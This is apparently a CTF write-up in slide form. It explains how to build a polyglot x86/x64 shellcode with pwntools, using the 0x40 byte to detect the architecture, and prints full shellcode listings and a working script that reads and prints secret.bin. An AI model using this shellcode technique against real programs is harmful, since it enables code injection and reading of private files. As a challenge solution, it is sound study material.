shellcode-poly

A polyglot shellcode that runs on both x86 and x64, and how I built it with pwntools.

Park Chanung

The task

Same bytes, two targets

  • target feeds one payload to target32 (32-bit) and target64 (64-bit).
  • Both must read and print secret.bin at runtime.
  • Print on both, and target hands over the flag.

The polyglot idea itself came from the article we all read, so this is not a tour of the trick. It is about how the payload actually gets built, which is where my solution differs from most.

Background

A short history of 0x40

  • 8086, 1978. Opcodes 40-47 are single-byte inc of the eight registers, 48-4F are dec. A code-density shortcut, kept through IA-32.
  • AMD64, around 2000. 16 registers and 64-bit operands need new encodings, but the one-byte opcode map is already full.
  • The fix: in long mode the whole 40-4F range becomes the REX prefix family. Single-byte inc/dec survive only as the two-byte FF /0, FF /1.
inc r32 · 40-47 dec r32 · 48-4F
404142434445464748494A4B4C4D4E4F
REX prefixes · 64-bit mode

Sixteen one-byte opcodes, reused. 0x40 is a full instruction in 32-bit, and a bare prefix in 64-bit.

Background

0x40 is the null REX prefix

  • REX stands for Register EXtension. Four bits, W R X B, that extend the next instruction: 64-bit operands and access to r8 through r15.
  • 0x40 sets none of them.
  • Its one visible effect: it switches the following byte-register operand from the legacy high set (ah ch dh bh) to the uniform low set (spl bpl sil dil).
; 0 1 0 0  W R X B
0x40 = 0100 0000
       └──┘ └─────┘
       REX   all zero

On x86 it is a whole instruction. On x64 it is a prefix that cannot stand alone.

Architecture detection

The detection prologue

xor eax, eax      ; 31 C0
.byte 0x40        ; 40        (the pivot byte)
mov bh, 1         ; B7 01
test eax, eax     ; 85 C0
jz  x64          ; 74 02
.byte 0xEB, N     ; EB N      (N = len(amd64))
x64:

Every mnemonic here is legacy-compatible and encodes identically in both modes. The whole fork rests on the single byte 0x40.

mov bh, 1 only gives the REX prefix something to attach to (bh on x86, dil on x64); it never touches eax.

x86jz falls through, then jmp +len(amd64) leaps over the amd64 block into i386.

The order is forced by the branch: x64 can only land immediately after the prologue, so amd64 goes first; x86 has to jump past it, so i386 goes last.

Building the payload

pwntools in this solution

pwntools is a Python framework for exploit development and CTF work. from pwn import * pulls its helpers into scope. This solution leans on two of them.

  • shellcraft gives you ready-made shellcode written as assembly, organized per architecture (shellcraft.i386, shellcraft.amd64). You ask for an action, it hands back the asm source.
  • asm(code, arch=...) assembles that source into raw machine-code bytes for whichever architecture you name.

Both run inside one Python script, so there is no separate build step to manage.

Building the payload

Generating the syscalls with shellcraft

i386  = shellcraft.i386.cat2('secret.bin', 1, 0x1000)
amd64 = shellcraft.amd64.cat2('secret.bin', 1, 0x1000)

i386asm  = asm(i386,  arch='i386')
amd64asm = asm(amd64, arch='amd64')
  • cat2 emits the full open, read, write sequence as assembly, per architecture.
  • Why cat2, not cat? cat uses sendfile, which is unreliable to a pipe; cat2 uses read plus write, which always works.
  • asm(code, arch=...) then assembles each one into raw machine-code bytes.

Building the payload

Each call unfolds into assembly

asm(shellcraft.i386.cat2(...), arch='i386')
  /* push 'secret.bin\x00' */
  push  0x1010101
  xor   dword ptr [esp], 0x1016f68
  push  0x622e7465
  push  0x72636573
  /* open(file='esp', oflag='O_RDONLY', mode=0x1000) */
  mov   ebx, esp
  xor   ecx, ecx
  xor   edx, edx
  mov   dh,  0x1000 >> 8
  /* call open() */
  push  SYS_open        /* 5 */
  pop   eax
  int   0x80
  sub   esp, edx
  /* read(fd='eax', buf='esp', nbytes='edx') */
  mov   ebx, eax
  mov   ecx, esp
  /* call read() */
  push  SYS_read        /* 3 */
  pop   eax
  int   0x80
  /* write(fd=1, buf='esp', n='eax') */
  push  1
  pop   ebx
  mov   ecx, esp
  mov   edx, eax
  /* call write() */
  push  SYS_write       /* 4 */
  pop   eax
  int   0x80
asm(shellcraft.amd64.cat2(...), arch='amd64')
  /* push b'secret.bin\x00' */
  push  0x1010101 ^ 0x6e69
  xor   dword ptr [rsp], 0x1010101
  mov   rax, 0x622e746572636573
  push  rax
  /* call open('rsp', 'O_RDONLY', 0x1000) */
  push  SYS_open        /* 2 */
  pop   rax
  mov   rdi, rsp
  xor   edx, edx
  mov   dh,  0x1000 >> 8
  xor   esi, esi        /* O_RDONLY */
  syscall
  sub   rsp, rdx
  /* call read('rax', 'rsp', 'rdx') */
  mov   rdi, rax
  xor   eax, eax        /* SYS_read */
  mov   rsi, rsp
  syscall
  /* call write(1, 'rsp', 'rax') */
  mov   rdx, rax
  push  SYS_write       /* 1 */
  pop   rax
  push  1
  pop   rdi
  mov   rsi, rsp
  syscall

Building the payload

The jump offset computes itself

.byte 0xeb, {len(amd64asm)}   # displacement that skips the amd64 block
  • Writing this by hand means counting the amd64 block yourself to fill that one displacement byte.
  • Here Python measures the already-assembled bytes.
  • Edit the payload and the offset follows. Nothing to recount, nothing to get wrong.

Building the payload

The full solution

from pwn import *

i386  = shellcraft.i386.cat2('secret.bin', 1, 0x1000)
amd64 = shellcraft.amd64.cat2('secret.bin', 1, 0x1000)

i386asm  = asm(i386,  arch='i386')
amd64asm = asm(amd64, arch='amd64')
jmpasm = asm(f'''
xor eax, eax
.byte 0x40
mov bh, 1
test eax, eax
jz x64
.byte 0xeb, {len(amd64asm)}
x64:
''', arch='i386')

print(jmpasm + amd64asm + i386asm)
